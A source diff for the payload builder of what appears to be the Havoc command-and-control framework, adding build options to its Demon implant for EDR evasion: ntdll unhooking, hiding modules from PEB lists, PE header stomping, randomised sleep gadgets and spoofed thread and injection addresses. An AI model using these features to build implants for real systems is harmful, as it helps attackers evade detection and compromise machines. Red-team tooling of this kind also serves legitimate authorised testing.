@@ -143,6 +143,17 @@ type Builder struct {
 	outputPath string
 	preBytes   []byte
 
+	// demonProfile holds address-resolution config read directly from the teamserver profile
+	// for fields that are not surfaced in the client payload UI (SleepObfStartAddr, InjectSpoofAddr).
+	demonProfile struct {
+		SleepObfLib       string
+		SleepObfFunc      string
+		SleepObfOffset    int
+		InjectSpoofLib    string
+		InjectSpoofFunc   string
+		InjectSpoofOffset int
+	}
+
 	// [HVC-005 2026-03-28] BCRYPT_RSAPUBLIC_BLOB embedded as SERVER_PUBKEY_BLOB.
 	rsaPublicKeyBlob []byte
 
@@ -169,6 +180,7 @@ func NewBuilder(config BuilderConfig) *Builder {
 
 	builder.compilerOptions.SourceDirs = []string{
 		"src/core",
+		"src/commands",
 		"src/crypt",
 		"src/inject",
 		"src/asm",
@@ -213,6 +225,10 @@ func NewBuilder(config BuilderConfig) *Builder {
 		"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
 		"-falign-labels=1 -fPIC",
 		"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
+		/* Target Windows 8.1+ so that Vista+/Win8.1+ APIs (PssCaptureSnapshot, etc.)
+		 * are declared by MinGW headers. Without this, MinGW defaults to 0x0502 (XP SP2)
+		 * and those symbols are conditionally compiled out of the relevant headers. */
+		"-D_WIN32_WINNT=0x0603",
 	}
 
 	builder.compilerOptions.Main.Dll = "src/main/MainDll.c"
@@ -497,6 +513,8 @@ func (b *Builder) Build() bool {
 		DllPayload.ClientId = b.ClientId
 		DllPayload.SendConsoleMessage = b.SendConsoleMessage
 		DllPayload.config.Config = b.config.Config
+		// Propagate profile address defaults to the inner DLL builder (plain struct copy - no pointers)
+		DllPayload.demonProfile = b.demonProfile
 		DllPayload.SetArch(b.config.Arch)
 		DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
 		DllPayload.SetPatchConfig(b.ProfileConfig.Original)
@@ -512,6 +530,10 @@ func (b *Builder) Build() bool {
 		// SERVER_PUBKEY_BLOB;` line in DemonMetaData(), and Build() returns false.
 		DllPayload.SetRSAPublicKey(b.rsaPublicKeyBlob)
 		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")
+		// Shellcode payloads must never include debug output regardless of --debug-dev.
+		// The inner DLL inherits DebugDev from the outer builder config; clear it here
+		// so DEBUG / DEBUG_NOSTDLIB are not defined in the shellcode DLL build.
+		DllPayload.compilerOptions.Config.DebugDev = false
 
 		if b.innerBuilderSetup != nil {
 			b.innerBuilderSetup(DllPayload)
@@ -688,6 +710,24 @@ func (b *Builder) SetPatchConfig(Config any) {
 	}
 }
 
+// SetDemonProfileDefaults reads address-resolution config from the parsed YAOTL Demon profile block.
+// These fields are not part of the client UI config map; they are applied on the teamserver side.
+func (b *Builder) SetDemonProfileDefaults(demon *profile.Demon) {
+	if demon == nil {
+		return
+	}
+	if demon.SleepObfStartAddr != nil {
+		b.demonProfile.SleepObfLib = demon.SleepObfStartAddr.Library
+		b.demonProfile.SleepObfFunc = demon.SleepObfStartAddr.Function
+		b.demonProfile.SleepObfOffset = demon.SleepObfStartAddr.Offset
+	}
+	if demon.InjectSpoofAddr != nil {
+		b.demonProfile.InjectSpoofLib = demon.InjectSpoofAddr.Library
+		b.demonProfile.InjectSpoofFunc = demon.InjectSpoofAddr.Function
+		b.demonProfile.InjectSpoofOffset = demon.InjectSpoofAddr.Offset
+	}
+}
+
 func (b *Builder) SetFormat(Format int) {
 	b.FileType = Format
 }
@@ -776,21 +816,34 @@ func (b *Builder) Patch(ByteArray []byte) []byte {
 
 func (b *Builder) PatchConfig() ([]byte, error) {
 	var (
-		DemonConfig        = packer.NewPacker(nil, nil)
-		ConfigSleep        int
-		ConfigJitter       int
-		ConfigAlloc        int
-		ConfigExecute      int
-		ConfigSpawn64      string
-		ConfigSpawn32      string
-		ConfigObfTechnique int
-		ConfigObfBypass    int
-		ConfigProxyLoading  = PROXYLOADING_NONE
-		ConfigStackSpoof    = win32.FALSE
-		ConfigSyscall       = win32.FALSE
-		ConfigAmsiPatch     = AMSIETW_PATCH_NONE
-		ConfigAutoProxy     = win32.TRUE  /* [HVC-026] default ON — preserves existing always-on behavior */
-		err                 error
+		DemonConfig             = packer.NewPacker(nil, nil)
+		ConfigSleep             int
+		ConfigJitter            int
+		ConfigAlloc             int
+		ConfigExecute           int
+		ConfigSpawn64           string
+		ConfigSpawn32           string
+		ConfigObfTechnique      int
+		ConfigObfBypass         int
+		ConfigProxyLoading      = PROXYLOADING_NONE
+		ConfigStackSpoof        = win32.FALSE
+		ConfigSyscall           = win32.FALSE
+		ConfigAmsiPatch         = AMSIETW_PATCH_NONE
+		ConfigRandGadget        = win32.FALSE /* random gadget per sleep cycle — HVC-030 Sub-3 */
+		ConfigUnhookNtdll       = win32.FALSE /* overwrite ntdll .text with clean KnownDlls copy — HVC-031 Sub-4 */
+		ConfigHideModules       = win32.FALSE /* unlink loaded modules from PEB LDR lists — HVC-031 Sub-2 */
+		ConfigPeStomp           = win32.FALSE /* stomp PE header during default sleep — ISS-037; off by default */
+		ConfigVerbose           = win32.FALSE /* enable verbose debug output in demon */
+		ConfigCoffeeVeh         = win32.FALSE /* enable VEH for BOF object file loading */
+		ConfigCoffeeThreaded    = win32.FALSE /* enable threaded object file execution */
+		ConfigSleepObfLib       = ""          /* custom sleep-obf thread start address library (empty = default) */
+		ConfigSleepObfFunc      = ""          /* function name */
+		ConfigSleepObfOffset    = 0           /* byte offset */
+		ConfigInjectSpoofLib    = ""          /* inject spoof addr library (empty = no spoof addr) */
+		ConfigInjectSpoofFunc   = ""          /* function name */
+		ConfigInjectSpoofOffset = 0           /* byte offset */
+		ConfigAutoProxy         = win32.TRUE  /* [HVC-026] default ON — preserves existing always-on behavior */
+		err                     error
 	)
 
 	logger.Debug(b.config.Config)
@@ -834,8 +887,10 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 	if val, ok := b.config.Config["Auto Proxy Detection"].(bool); ok {
 		if val {
 			ConfigAutoProxy = win32.TRUE
+			b.SendConsoleMessage("Info", "Auto Proxy Detection: Enabled")
 		} else {
 			ConfigAutoProxy = win32.FALSE
+			b.SendConsoleMessage("Info", "Auto Proxy Detection: Disabled")
 		}
 	}
 
@@ -926,21 +981,21 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		case "Foliage":
 			ConfigObfTechnique = SLEEPOBF_FOLIAGE
 			if !b.silent {
-				b.SendConsoleMessage("Info", "Sleep Obfuscation: \"Foliage\"")
+				b.SendConsoleMessage("Info", "Sleep Obfuscation: Foliage")
 			}
 			break
 
 		case "Ekko":
 			ConfigObfTechnique = SLEEPOBF_EKKO
 			if !b.silent {
-				b.SendConsoleMessage("Info", "Sleep Obfuscation: \"Ekko\"")
+				b.SendConsoleMessage("Info", "Sleep Obfuscation: Ekko")
 			}
 			break
 
 		case "Zilean":
 			ConfigObfTechnique = SLEEPOBF_ZILEAN
 			if !b.silent {
-				b.SendConsoleMessage("Info", "Sleep Obfuscation \"Zilean\"")
+				b.SendConsoleMessage("Info", "Sleep Obfuscation: Zilean")
 			}
 			break
 
@@ -1081,6 +1136,88 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		return nil, errors.New("AMSI/ETW Patch Undefined")
 	}
 
+	/* RandGadget — re-select gadget address each sleep cycle when enabled */
+	if val, ok := b.config.Config["Random Gadget"].(bool); ok {
+		if val {
+			ConfigRandGadget = win32.TRUE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Random Gadget: Enabled")
+			}
+		}
+	}
+
+	/* UnhookNtdll — overwrite loaded ntdll .text with clean KnownDlls copy at init */
+	if val, ok := b.config.Config["Unhook Ntdll"].(bool); ok {
+		if val {
+			ConfigUnhookNtdll = win32.TRUE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Unhook Ntdll: Enabled")
+			}
+		}
+	}
+
+	/* HideModules — unlink dynamically loaded modules from PEB LDR lists */
+	if val, ok := b.config.Config["Hide Modules"].(bool); ok {
+		if val {
+			ConfigHideModules = win32.TRUE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Hide Modules: Enabled")
+			}
+		}
+	}
+
+	/* PeStomp — stomp PE header region during default sleep (ISS-037); off by default */
+	if val, ok := b.config.Config["PE Stomping"].(bool); ok {
+		if val {
+			ConfigPeStomp = win32.TRUE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "PE Header Stomping: Enabled")
+			}
+		}
+	}
+
+	/* Verbose — enable verbose debug logging in Demon */
+	if val, ok := b.config.Config["Verbose"].(bool); ok {
+		if val {
+			ConfigVerbose = win32.TRUE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Verbose: Enabled")
+			}
+		}
+	}
+
+	/* CoffeeVEH — enable VEH for BOF object file loading */
+	if val, ok := b.config.Config["Coffee VEH"].(bool); ok {
+		if val {
+			ConfigCoffeeVeh = win32.TRUE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Coffee VEH: Enabled")
+			}
+		}
+	}
+
+	/* CoffeeThreaded — enable threaded object file execution */
+	if val, ok := b.config.Config["Coffee Threaded"].(bool); ok {
+		if val {
+			ConfigCoffeeThreaded = win32.TRUE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Coffee Threaded: Enabled")
+			}
+		}
+	}
+
+	/* Apply profile-based address resolution fields */
+	if b.demonProfile.SleepObfLib != "" {
+		ConfigSleepObfLib = b.demonProfile.SleepObfLib
+		ConfigSleepObfFunc = b.demonProfile.SleepObfFunc
+		ConfigSleepObfOffset = b.demonProfile.SleepObfOffset
+	}
+	if b.demonProfile.InjectSpoofLib != "" {
+		ConfigInjectSpoofLib = b.demonProfile.InjectSpoofLib
+		ConfigInjectSpoofFunc = b.demonProfile.InjectSpoofFunc
+		ConfigInjectSpoofOffset = b.demonProfile.InjectSpoofOffset
+	}
+
 	// behaviour configuration (alloc/exec/spawn)
 	DemonConfig.AddInt(ConfigAlloc)
 	DemonConfig.AddInt(ConfigExecute)
@@ -1094,6 +1231,19 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 	DemonConfig.AddInt(ConfigProxyLoading)
 	DemonConfig.AddInt(ConfigSyscall)
 	DemonConfig.AddInt(ConfigAmsiPatch)
+	DemonConfig.AddInt(ConfigRandGadget)
+	DemonConfig.AddInt(ConfigUnhookNtdll)
+	DemonConfig.AddInt(ConfigHideModules)
+	DemonConfig.AddInt(ConfigPeStomp)            /* field 15 */
+	DemonConfig.AddInt(ConfigVerbose)            /* field 16 */
+	DemonConfig.AddInt(ConfigCoffeeVeh)          /* field 17 */
+	DemonConfig.AddInt(ConfigCoffeeThreaded)     /* field 18 */
+	DemonConfig.AddString(ConfigSleepObfLib)     /* field 19: empty = default RtlUserThreadStart */
+	DemonConfig.AddString(ConfigSleepObfFunc)    /* field 20 */
+	DemonConfig.AddInt(ConfigSleepObfOffset)     /* field 21 */
+	DemonConfig.AddString(ConfigInjectSpoofLib)  /* field 22: empty = no spoof addr */
+	DemonConfig.AddString(ConfigInjectSpoofFunc) /* field 23 */
+	DemonConfig.AddInt(ConfigInjectSpoofOffset)  /* field 24 */
 
 	// Listener Config
 	switch b.config.ListenerType {
